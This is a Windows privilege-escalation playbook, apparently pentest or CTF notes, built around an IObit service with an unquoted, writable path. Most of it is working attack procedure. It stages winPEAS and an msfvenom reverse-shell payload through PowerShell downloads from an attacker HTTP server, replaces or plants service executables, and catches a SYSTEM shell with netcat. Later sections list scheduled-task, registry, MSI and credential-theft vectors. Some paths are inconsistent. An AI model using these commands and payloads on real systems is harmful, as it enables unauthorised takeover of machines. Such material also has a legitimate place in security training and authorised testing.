
### ==0. Already SYSTEM?== 

Primary:
`set USERPROFILE` (type this do not copy and paste)

Fallback (this command may disconnect shell):
`cmd.exe /c whoami`

- `USERPROFILE=C:\Windows\system32\config\systemprofile` → SYSTEM-level foothold (highest privileges). Skip Checksheet → exit to post-exploitation phase per engagement objective. - Any other path → continue to Section 1.

### ==1. Automated Enumeration==

#### **Step 1: Transfer winPEAS to the Target**

1. First check if the Windows machine you are attacking is a x86 or x64 architecture:

`systeminfo | findstr /i "System Type"`

Look for `System Type`. For example, `x64-based PC`, in this case you would be on a x64 architecture.

2. Download the appropriate `winPEAS` executable onto your attacker machine (**NB: the command below is for the `x64` version**). 

`wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASx64.exe -O winPEAS.exe`

**Make sure to you place the `winPEAS.exe` executable in the same directory that you are running your Simple Http Server from.**

3. On the Windows target, download `winPEAS` using PowerShell (**Make sure your local IP Address and Port number for your Simple Http Server are correct in the below command. Also, you need to specify the file path where you want to put winPEAS on the target server, put it somewhere stealthy, like inside your current user's AppData folder**):

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.21.16.252:8080/winPEAS.exe','C:\Users\bill\AppData\winPEAS.exe')"`

If successful, you should see the request in your Simple Http Server terminal window:

`10.10.47.233 - - [09/Mar/2025 14:36:45] "GET /winPEAS.exe HTTP/1.1" 200 -`

Also, check that the file is now on the target Windows machine:

`dir C:\Users\Public\`

#### **Step 2: Run `winPEAS` on the Target**

1. Execute `winPEAS` on the target, redirecting the output to a text file, otherwise it can block the terminal of your reverse shell:

`powershell -Command "Start-Process 'C:\Users\bill\AppData\winPEAS.exe' -ArgumentList '>' -NoNewWindow -RedirectStandardOutput 'C:\Users\bill\AppData\winPEAS.txt'"`

2. Now, view the `winPEAS.txt` output, in order to view the output from running the `winPEAS.exe` executable:

`type C:\Users\bill\AppData\winPEAS.txt`

3. Look for **"Unquoted Service Paths"** or **"unquoted paths"** in the output. You are looking for lines like this:

`AdvancedSystemCareService9(IObit - Advanced SystemCare Service 9)[C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe] - Auto - Running - No quotes and Space detected`
`
Here `winPEAS` tells you "No quotes and Space detected". Furthermore, you can see for yourself that there is a space in "Program Files (x86)". Without quotes, Windows might look at the path and interpret `C:\Program` as the executable name (and not the full path).

**NB: Importantly, you need to see that your current user, with whom you have a foothold on the target system, can overwrite the executable of the vulnerable service. In this instance, we can see that our user "bill" can "WriteData" and "CreateFiles" in the directory C:\Program Files (x86)\IObit\Advanced SystemCare:**

`File Permissions: bill [WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files (x86)\IObit\Advanced SystemCare (bill [WriteData/CreateFiles])`

**Also note, if the service is "running" or not, as you may have to manually stop the service and restart it. The example above specifically shows that the service is running:**

`Auto - Running - No quotes and Space detected`

#### **Step 3: Confirm the Service Name Manually**

In step 2, directly above, we should have identified the name of a vulnerable service. In our case the name appears to be "AdvancedSystemCareService9". To confirm that winPEAS has returned the correct service name, run the following command:

`powershell -c "Get-WmiObject win32_service | Select-Object Name, PathName"`

Look for the service in the output, and confirm that you do in fact have the correct service name. Expected output:

`AdvancedSystemCareService9    C:\Program Files\IObit\Advanced SystemCare\ASCService.exe`

Now we know the service we need to exploit.

#### **Step 4: Generate a Malicious Payload with msfvenom**

1. On your attacker/local machine, create a malicious reverse shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.16.252 LPORT=4445 -f exe -o ASCService.exe`

**NB: We are using the output file "ASCService.exe" here, as the this is the path of the vulnerable service we located on the target server `C:\Program Files\IObit\Advanced SystemCare\ASCService.exe`**
`
**NB: Make sure you have your correct local IP Address, the correct architecture of the target machine, in this case x64, and note the local port number you are using, as you will be setting up another local listener.**

2. Move your malicious payload to the same directory you are running your Simple Http Server from.

3. On the Windows target, download the payload:

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.21.16.252:8080/ASCService.exe','C:\Users\Public\ASCService.exe')"`

**Here we are uploading the file to a directory we know we will have write access to because this is the user we are currently logged into the target machine as. We will move the file at a later stage.**

4. Check the file is successfully on the target machine:

`dir C:\Users\Public\`

#### **Step 5: Executing the Malicious Payload**

1. If the vulnerable service was running in step 2, we need to first stop the service, otherwise you can skip this step:

`sc stop AdvancedSystemCareService9`

Run:

`powershell -c "Get-Service"`

You should now see this service showing as "Stopped"

2. Replace the service binary with your malicious payload. Since the service path is:

`C:\Program Files\IObit\Advanced SystemCare\ASCService.exe`

.. our payload is located here:

`C:\Users\Public\ASCService.exe`

We will replace the legitimate executable with our malicious one, like so:

`C:\Users\Public>copy ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"`

You should see success message:

` 1 file(s) copied.`

3. Start a local `nc` listener with the same port you used when creating your malicious payload, in this case 4445 (**be sure to do this in a new dedicated terminal window**):

`nc -lvnp 4445`

4. Restart the vulnerable service, executing your payload:

`sc start AdvancedSystemCareService9`

5. Confirm you are now have top level privilege in your `nc` shell:

`C:\Windows\system32>whoami`

... should output:

`nt authority\system`

### ==2. **Unquoted Service Path Exploitation**==

#### **Step 1: Check for Unquoted Service Paths**

1. Search for unquoted service paths, redirect the output to a text file:

`wmic service get name,displayname,startmode,pathname > services.txt`

2. Print the output of the search in the terminal window:

`type services.txt`

3. The output will look something like this:

| Name                       | PathName                                                         |
| -------------------------- | ---------------------------------------------------------------- |
| AdvancedSystemCareService9 | C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe  |
| AeLookupSvc                | C:\Windows\system32\svchost.exe -k netsvcs                       |
| ALG                        | C:\Windows\System32\alg.exe                                      |
| AmazonSSMAgent             | "C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"               |
| AppHostSvc                 | C:\Windows\system32\svchost.exe -k apphost                       |
| AppIDSvc                   | C:\Windows\system32\svchost.exe -k LocalServiceNetworkRestricted |
| Appinfo                    | C:\Windows\system32\svchost.exe -k netsvcs                       |
| AppMgmt                    | C:\Windows\system32\svchost.exe -k netsvcs                       |

1. **Firstly, find services with unquoted PathNames.**  
	In your example, 7 out of 8 services have unquoted paths.
2. **Secondly, among those unquoted paths, identify which have path components containing spaces.**  
    In the example, only one PathName fits this criterion:  
    `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

When a service’s executable path is **unquoted** and contains **spaces**, Windows may incorrectly parse the path when launching the service. It breaks the path into separate tokens at spaces, treating each as a possible executable location.

For example, the path:

`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

If unquoted, Windows might interpret it as:

- `C:\Program.exe`
    
- `C:\Program Files (x86)\IObit\Advanced.exe`
    
- `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`
    

**NB: `C:\Program Files.exe` is not exploitable because Windows does not allow a file to exist in the same place with the same base name as a folder. E.G. you cannot create a file like `C:\Program Files.exe` if the `C:\Program Files` folder already exists**

Windows tries to execute the first matching file it finds in these locations.

If an attacker can place a malicious executable named `C:\Program.exe` or `C:\Program Files (x86)\IObit\Advanced.exe` (or similarly named) **before the legitimate executable runs**, the system might run the attacker’s code with the service’s privileges, often SYSTEM.

#### **Step 2: Confirm Service Privileges**

1. Run this command with the name of the service you wish to check the privilege level for, in this case `AdvancedSystemCareService9`.

`sc qc AdvancedSystemCareService9`

The output will look something like this:

Service: AdvancedSystemCareService9
- **Service Name:** AdvancedSystemCareService9  
- **Display Name:** Advanced System Care Service 9  
- **Type:** 110 (WIN32_OWN_PROCESS - interactive)  
- **Start Type:** 2 (AUTO_START)  
- **Error Control:** 1 (NORMAL)  
- **Binary Path:** `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`  
- **Load Order Group:** System Reserved  
- **Tag:** 1  
- **Dependencies:** None  
- **Service Start Name:** LocalSystem

**In order to proceed, the value of the `Service Start Name` field needs to be `LocalSystem`. `LocalSystem` is the most powerful built-in account on Windows, it has full administrative rights and access to the entire system. If you can exploit a vulnerability in a service running as LocalSystem, you can execute code as SYSTEM, effectively owning the machine**

#### **Step 3: Can you write to the directory path?**

You should now have an unquoted service path, with spaces, that is executed by `LocalSystem`.

The full directory path in this example is:

`C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

As previously discussed, in order to have the system execute your malicious payload, you will need place your malicious file in one of the following locations:

- `C:\Program.exe`
    
- `C:\Program Files (x86)\IObit\Advanced.exe`
    
- `C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe`

Therefore, your current user needs to be able to write to one of the following directories:

- `C:\`
    
- `C:\Program Files (x86)\IObit\`
    
- `C:\Program Files (x86)\IObit\Advanced SystemCare\`

1. Can your user write to `C:\`

`echo test > C:\test.txt`

2. Do the write attempt succeed:

`dir C:\`

If writing a file to the specified folder did not succeed, they retry with the next directory path in the list, in this case:

`echo test > "C:\Program Files (x86)\IObit\"`

**Remember you will need quotation marks as there are spaces in the file path**

Once you have identified which folder your user can write to make a note of the string you will use to mimic the payload. For example, if you can write to `C:\Program Files (x86)\IObit\`, then given the above exploitation examples, your payload file will need to be named `Advanced.exe`, i.e. the executable path will be `C:\Program Files (x86)\IObit\Advanced.exe`, as shown above.

#### **Step 4: Generate a Malicious Payload with msfvenom**

1. On your attacker/local machine, create a malicious reverse shell:

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.21.16.252 LPORT=4445 -f exe -o Advanced.exe`

**NB: We are using the output file "Advanced.exe" here, as the this the executable file path we identified in Step 3, i.e. the path of the vulnerable service we located on the target server `C:\Program Files\IObit\` followed by the string we will be replacing with our executable.**
`
**NB: Make sure you have your correct local IP Address, the correct architecture of the target machine, in this case x64, and note the local port number you are using, as you will be setting up another local listener.**

2. Move your malicious payload to the same directory you are running your Simple Http Server from.

3. On the Windows target, download the payload, placing it in the vulnerable execution path:

`powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://10.21.16.252:8080/Advanced.exe','C:\Program Files (x86)\IObit\Advanced.exe')"`

4. Check the file is successfully on the target machine:

`dir "C:\Program Files (x86)\IObit\"`

#### **Step 5: Executing the Malicious Payload**

1. What is the current state of the service we are looking to exploit:

`sc query AdvancedSystemCareService9`

If the service's state is `STOPPED` we can proceed, otherwise you need to stop it with:

`sc stop AdvancedSystemCareService9`

2. Start a local `nc` listener with the same port you used when creating your malicious payload, in this case 4445 (**be sure to do this in a new dedicated terminal window**):

`nc -lvnp 4445`

3. Restart the vulnerable service, executing your payload:

`sc start AdvancedSystemCareService9`

5. Confirm you are now have top level privilege in your `nc` shell:

`C:\Windows\system32>whoami`

... should output:

`nt authority\system`


### ==3. **Windows-Exploit-Suggester-python3**==

You can use the `Windows-Exploit-Suggester-python3` script, to identify potential privilege escalation exploits, specific to the target system you are attempting to exploit.
#### **Step 1: Obtain the Python Script**

1. You need to download the script to your attacking machine (you likely already have this script in `/home/your_user/Tools`). If not, it is available here: `https://github.com/Pwnistry/Windows-Exploit-Suggester-python3`
2. Simply copy the Python script to your local machine, to a directory of your choosing.
3. **Make sure the script is executable by you:**

`sudo chmod +x windows_exploit_suggester_python3.py`

#### **Step 2: Download the Microsoft Security Bulletin Database**

1. Download the security bulletin database from Microsoft with the `--update` flag.

`./windows_exploit_suggester_python3.py --update`

This will save an `.xlsx` file in the same directory that you ran the command from.

2. **You must now save the file as `.xls` format before proceeding any further. You can do so using `LibreOffice Calc`**
3. One you have saved a `.xls` version, remove the `.xlsx` version.

#### **Step 3: Save the Target's `systeminfo`**

1. You need to run the following command on the target server:

`systeminfo`

2. Copy the output and save it to a `.txt` file on your local machine, e.g. `target_systeminfo.txt`

**You should now have the Python script `windows_exploit_suggester_python3.py`, the Microsoft security bulletin database `{msDatabase}.xls`, and the target system's `systeminfo`, saved as a text file `target_systeminfo.txt`.**

#### **Step 4: Execute the `Windows Exploit Suggester` script**

`python ./{windows_exploit_suggester_python3}.py --database {2021-04-16-mssb}.xls --systeminfo {win7}.txt | grep "\[M\]\|\[E\]" | grep "Elevation"`

**File names are marked with double curl-braces, as obviously they may vary.**

**The command filters the output to only show local privilege escalation exploits that have either a Metasploit module (`[M]`) or an Exploit-DB reference (`[E]`), and the word `"Elevation"` in their description.**

**Final note on Windows Exploit Suggester output:**
1. Just because an exploit appears in the output doesn’t **guarantee it will work** on the target.
2. You always need to **verify** exploit compatibility with the actual target OS version and patch level. 
3. The tool errs on the side of caution by listing all _potential_ exploits that could be applicable. Therefore, some results returned will likely not even be applicable to your target OS version, you need need to check the comments in the Exploit itself, etc.


### ==4. Identify OS & Patch Level==

Command:

`systeminfo`

#### 🔎 What to Look For:

| Field                     | Why It Matters                                                                |
| ------------------------- | ----------------------------------------------------------------------------- |
| **OS Name**               | E.g., _Microsoft Windows Server 2012 R2_ — helps narrow down exploit targets. |
| **OS Version / Build**    | E.g., _6.3.9600_ — used to identify specific CVEs affecting this version.     |
| **System Type**           | _x86-based PC_ or _x64-based PC_ — determines which binary exploit to use.    |
| **Hotfixes**              | A short list means it's likely unpatched and vulnerable.                      |
| **Original Install Date** | If old + low patch count → good candidate for privilege escalation.           |
#### 🔢 What Counts as a "Short List" of Hotfixes?

| Hotfix Count | Interpretation                                                                                                      |
| ------------ | ------------------------------------------------------------------------------------------------------------------- |
| **0–10**     | 🚨 _Very likely unpatched._ Ideal for CTFs. Proceed to check for kernel exploits (Proceed to Concrete Next Steps).  |
| **11–50**    | ⚠️ _Possibly patched, but still worth checking for older PrivEsc vulnerabilities (Proceed to Concrete Next Steps)._ |
| 50+          | ✅ _Probably well-patched._ Focus more on misconfigs (e.g. Proceed to next step)                                     |
#### ✅ Concrete Next Steps:

#### 1. **OS Exploit Index** 

Go to `OS Exploit Index/Windows/` and find the note specific to the target's OS version.

---

### ==5. Enumerate Local Admins & Groups==

Commands:

`net localgroup administrators net localgroup`

**What to look for:**

- List of users in the **Administrators** group.
    
- Any service accounts or unexpected users with admin privileges.
    

**Next steps:**

- If you have a user in the group, privilege escalation might be trivial (log in or impersonate).
    
- Otherwise, look for ways to add yourself or escalate via other vectors.
    

---

### ==6. Check Services & Their Permissions==

Commands:

`Get-WmiObject win32_service | Select Name, PathName, StartName icacls "C:\Path\To\Service\Executable"`

**What to look for:**

- Services running as **SYSTEM** or **Admins** — prime targets.
    
- **Unquoted service paths** — e.g., if path has spaces but no quotes, you can place a malicious executable in path prefix.
    
- Services where the executable or folder is **writable** by your user.
    

**Next steps:**

- Exploit unquoted path by placing malicious executable in path.
    
- Replace writable service executable with your payload.
    

---

### ==7. Review Scheduled Tasks==

Command:

`schtasks /query /fo LIST /v`

**What to look for:**

- Tasks running as **SYSTEM** or admin users.
    
- Tasks that execute scripts or binaries in locations writable by your user.
    
- Tasks that run frequently or at login.
    

**Next steps:**

- Replace script/binary with malicious version or create your own task.
    
- Use task to escalate on next run.
    

---

### ==8. Look for Writable System or Service Directories==

Commands:

`icacls C:\Windows\System32 | findstr "Everyone" icacls C:\Users\%username%\AppData\Local\Temp`

**What to look for:**

- Directories or files writable by **Everyone** or your user that shouldn’t be.
    
- Scripts, config files, or executables in these directories.
    

**Next steps:**

- Place or modify binaries/scripts to execute code as privileged user.
    

---

### ==9. Check Registry for Known Escalation Vectors==

Commands:

`reg query "HKLM\Software\Policies\Microsoft\Windows\Installer" /v "AlwaysInstallElevated" reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "EnableLUA"`

**What to look for:**

- `AlwaysInstallElevated` set to 1 (enabled) in both HKLM and HKCU → allows MSI installs to run with SYSTEM privileges.
    
- `EnableLUA` disabled → possible to bypass UAC.
    

**Next steps:**

- If `AlwaysInstallElevated` enabled → craft malicious MSI and install.
    
- Use UAC bypass techniques if `EnableLUA` disabled.
    

---

### ==10. Search for Stored Passwords or Credentials==

Commands:

- Search user documents, scripts, or config files for passwords.
    
- Use tools like `creddump` or PowerShell scripts if available.
    

**What to look for:**

- Plaintext or encoded passwords in scripts or config files.
    
- Password reuse on privileged accounts.
    

**Next steps:**

- Use found credentials to log in as privileged user.
    

---

